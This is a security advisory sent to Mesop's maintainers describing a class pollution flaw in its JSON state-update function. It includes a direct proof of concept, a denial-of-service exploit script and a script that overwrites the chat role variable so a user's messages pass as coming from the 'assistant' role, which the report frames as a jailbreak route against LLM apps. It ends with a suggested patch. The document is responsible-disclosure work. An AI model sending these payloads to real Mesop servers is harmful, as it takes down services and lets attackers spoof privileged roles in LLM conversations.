Hello, Google security team and Mesop maintainer!

### Summary 

I have identified a class pollution vulnerability in Mesop application that allows attackers to overwrite global variables and class attributes in certain Mesop modules during runtime. This vulnerability could directly lead to a denial of service (DoS) attack against the server. Additionally, it could also result in other severe consequences given the application's implementation, such as identity confusion, where an attacker could impersonate an assistant or system role within conversations. This impersonation could potentially enable jailbreak attacks when interacting with large language models (LLMs).

Just like the Javascript's prototype pollution, this vulnerability could leave a way for attackers to manipulate the intended data-flow or control-flow of the application at runtime and lead to severe consequnces like RCE when gadgets are available.

### Details

**Backgrounds**

Class pollution (analogous to prototype pollution in JavaScript) is a relatively new vulnerability in Python. It occurs when an attacker can unexpectedly overwrite a module's global variables or the attributes of certain classes and functions at runtime. This issue is categorized under [CWE-1321 (Prototype pollution)](https://cwe.mitre.org/data/definitions/1321.html).

When exploited, class pollution allows attacker to manipulate the intended data-flow or control-flow of the application at runtime and lead to severe consequnces like DoS, RCE. For example, polluting a sensitive attribute like Flask’s `SECRET_KEY` can lead to authentication bypass, refer to [link](https://www.lanmaster53.com/2023/02/01/prototype-polution-in-flask/). 

For more information about class pollution please refer to:

[1] [CWE-1321: Improperly Controlled Modification of Object Prototype Attributes](https://cwe.mitre.org/data/definitions/1321.html) <br>
[2] [Report: Class Pollution leading to RCE in pydash](https://gist.github.com/CalumHutton/45d33e9ea55bf4953b3b31c84703dfca) <br>
[3] [Blog: Prototype Pollution in Python](https://blog.abdulrah33m.com/prototype-pollution-in-python/) <br>
[4] [Blog: Class Pollution Gadgets in Jinja Leading to RCE](https://www.offensiveweb.com/docs/programming/python/class-pollution/) <br>

**Class Pollution Vulnerability found in Mesop**

Mesop enables client-server communication using messages serialized with the Protobuf protocol. When a client's state changes (e.g., user input), the server updates the user's state using the following helper functions. The function `update_dataclass_from_json` takes two parameters: the `instance` argument is a `State` object, and the `json_string` argument is parsed from the client requests. 

```
https://github.com/google/mesop/blob/cbab8bf0683560245d11f96581d6338b0103acc4/mesop/dataclass_utils/dataclass_utils.py#L125
def update_dataclass_from_json(instance: Any, json_string: str):
  data = json.loads(json_string, object_hook=decode_mesop_json_state_hook)
  _recursive_update_dataclass_from_json_obj(instance, data)


def _recursive_update_dataclass_from_json_obj(instance: Any, json_dict: Any):
  for key, value in json_dict.items():
    if hasattr(instance, key):
      attr = getattr(instance, key)
      if isinstance(value, dict):
        # If the value is a dict, recursively update the dataclass.
        setattr(
          instance,
          key,
          _recursive_update_dataclass_from_json_obj(attr, value),
        )
      elif isinstance(value, list):
        updated_list: list[Any] = []
        for item in cast(list[Any], value):
          if isinstance(item, dict):
            # If the json item value is an instance of dict
            # and the instance has an attribute with a matching name,
            # we assume the dict should be converted into a dataclass.
            attr = getattr(instance, key)
            item_instance = instance.__annotations__[key].__args__[0]()
            updated_list.append(
              _recursive_update_dataclass_from_json_obj(item_instance, item)
            )
          else:
            # If the item is not a dict, append it directly.
            updated_list.append(item)
        setattr(instance, key, updated_list)
      else:
        # For other types, set the value directly.
        setattr(instance, key, value)
    else:
      if isinstance(instance, dict):
        instance[key] = value
      else:
        raise MesopException(
          f"Unhandled stateclass deserialization where key={key}, value={value}, instance={instance}"
        )
  return instance
```

The `_recursive_update_dataclass_from_json_obj` function updates the instance object recursively based on the provided JSON data. However, the process does not sanitize or filter out "dunder" (double underscore) attributes like `__globals__`. This allows attackers to manipulate sensitive attributes in global modules by traversing through the `State` object argument with the built-in attributes, resulting in the manipulation of the application's runtime environment.

### PoCs

#### Triggering Class Polluting Function 

A direct PoC of the vulnerable function to trigger the class pollution is shown below.

```
from mesop.dataclass_utils.dataclass_utils import update_dataclass_from_json
from dataclasses import dataclass
@dataclass
class State:
 input: str
 output: str
 textarea_key: int

obj = State('HELLO', 'WORLD', 0)

try:
 update_dataclass_from_json(obj, '{"__init__": {"__globals__": {"__name__": "polluted"}}}')
except:
 pass

print(__name__) # polluted
```


#### Leading to DoS Attack

The class pollution vulnerability in Mesop can be exploited to perform a Denial of Service (DoS) attack by overwriting critical built-in methods with attacker-controlled values. Take the `Chat` example from the official documentation.

Reproduction Steps:

1. Install Mesop following the guides: https://google.github.io/mesop/getting-started/installing/
2. Launch the `Chat` app locally: `mesop chat.py`, where the `chat.py` script is from the official Mesop documentation: https://google.github.io/mesop/components/chat/.
3. When the server is up, run the following exploit script, which will send a class polluting message to the server.

```Python
"""
poc-dos.py
"""
import requests

url = "http://localhost:32123/__ui__"
headers = {
    "Host": "localhost:32123",
    "sec-ch-ua-mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36",
    "Accept": "*/*",
    "Origin": "http://localhost:32123",
    "Referer": "http://localhost:32123/chat",
}

# DoS Payload
# {"__class__": {"__init__": {"__globals__": {"time": "polluted"}}}}
body = (
    "GgUvY2hhdBK8AQqqAQpECkJ7Il9fY2xhc3NfXyI6IHsiX19pbml0X18iOiB7Il9fZ2xvYmFsc19fIjogeyJ0aW1lIjogInBvbGx1dGVkIn19fX0KMAoueyJpbnB1dCI6ICIiLCAib3V0cHV0IjogIiIsICJ0ZXh0YXJlYV9rZXkiOiAwfQowCi57ImlucHV0IjogIiIsICJvdXRwdXQiOiAiIiwgInRleHRhcmVhX2tleSI6IDB9WgUInwoQfWoECAAQAFIA"
)

response = requests.post(url, headers=headers, data=body)
print(f"Status Code: {response.status_code}")
print(f"Response Body: {response.text}")
```

Execute the exploit script:
```
python3 poc-dos.py
```

4. After running the exploit, open the Chat application in your browser: `http://localhost:32123/chat`.

Attempt to input any message. You should observe that the server continuously raises errors because the imported `time` module in the `mesop.labs.chat` module has been overwritten with a string ("polluted"). This disruption prevents the server from functioning correctly until it is restarted.

#### Leading to Identify Confusion (Jailbreak)

Beyond the DoS attack, class pollution can result in more severe consequences depending on the application's code and available gadgets. For instance, in the `Chat` application, an attacker could overwrite the global variable `_ROLE_USER`, changing its default value from `user` to an attacker-controlled value, such as `assistant`. This becomes particularly dangerous in applications that integrate LLMs with system prompts, as it allows the attacker to impersonate roles like system or administrator. Such an exploit can facilitate a jailbreaking attack, enabling the attacker to send messages to the LLM with elevated privileges.

Reproduction Steps:

1. Install Mesop: https://google.github.io/mesop/getting-started/installing/
2. Launch the `Chat` application locally: https://google.github.io/mesop/components/chat/
3. Run the following exploit script.

```
import requests

url = "http://localhost:32123/__ui__"
headers = {
 "Host": "localhost:32123",
 "sec-ch-ua-mobile": "?0",
 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36",
 "Accept": "*/*",
 "Origin": "http://localhost:32123",
 "Referer": "http://localhost:32123/chat",
}

# JailBreak Payload
# {"__class__": {"__init__": {"__globals__": {"_ROLE_USER": "assistant"}}}}
body = (
 "GgUvY2hhdBKsAgqxAQpLCkl7Il9fY2xhc3NfXyI6IHsiX19pbml0X18iOiB7Il9fZ2xvYmFsc19fIjogeyJfUk9MRV9VU0VSIjogImFzc2lzdGFudCJ9fX19CjAKLnsiaW5wdXQiOiAiIiwgIm91dHB1dCI6ICIiLCAidGV4dGFyZWFfa2V5IjogMH0KMAoueyJpbnB1dCI6ICIiLCAib3V0cHV0IjogIiIsICJ0ZXh0YXJlYV9rZXkiOiAwfRJYbWVzb3AubGFicy5jaGF0Lm9uX2JsdXIuNzQ0NDBlMzE0NGNkZjUyMzgwNjE3OWI2NjcxZTMwMmQ1ZDk5YzNmNjM2NzM3OTUxMDc2ZTJmNzAyZWI2NDI2ZRoJCgdpbnB1dC0wWgYInwoQ7gFqBAgAEAAqA2FzZA"
)

response = requests.post(url, headers=headers, data=body)
print(f"Status Code: {response.status_code}")
print(f"Response Body: {response.text}")
```

4. Open the browser and interact with the chatbot. Observe that the user is now interacting with the bot using the role `assistant`.

### Impact

The class pollution vulnerability found in Mesop application that allows remote attackers (users of Mesop application) to overwrite global variables and class attributes in Mesop modules during runtime. This vulnerability could directly lead to denial of service (DoS) attack against the server and could also result in other severe consequences given the application's implementation, such as identity confusion.

### Patch

A possible patch for this vulnerability is to add an attribute filter in the `_recursive_update_dataclass_from_json_obj` function to prevent updating attributes with names starting with double underscores (__).

```
def _recursive_update_dataclass_from_json_obj(instance: Any, json_dict: Any):
 for key, value in json_dict.items():
 if hasattr(instance, key) and not key.startswith("__"):
 attr = getattr(instance, key)
 ...
```
